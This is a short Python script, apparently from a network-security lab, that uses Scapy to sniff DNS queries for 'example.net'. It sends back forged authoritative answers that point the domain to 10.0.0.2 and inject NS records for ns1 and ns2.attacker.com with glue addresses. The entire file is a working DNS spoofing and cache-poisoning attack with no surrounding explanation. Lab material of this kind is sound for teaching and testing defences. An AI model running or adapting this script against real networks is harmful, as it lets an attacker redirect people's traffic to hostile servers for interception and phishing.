#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and b'example.net' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=300, rdata='10.0.0.2')

        # Authority Section
        Authsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS', ttl=300, rdata='ns1.attacker.com.') / \
                  DNSRR(rrname=pkt[DNS].qd.qname, type='NS', ttl=300, rdata='ns2.attacker.com.')

        # Additional Section
        Addsec = DNSRR(rrname='ns1.attacker.com.', type='A', ttl=300, rdata='10.0.0.2') / \
                 DNSRR(rrname='ns2.attacker.com.', type='A', ttl=300, rdata='10.0.0.3')

        # Construct the DNS packet
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1, rd=0, qr=1,
            qdcount=1,
            ancount=1,
            nscount=2,
            arcount=2,
            an=Anssec,
            ns=Authsec,
            ar=Addsec
        )

        # Construct the entire IP packet
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print(f"[+] Spoofed DNS reply for {pkt[DNS].qd.qname.decode()}")

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
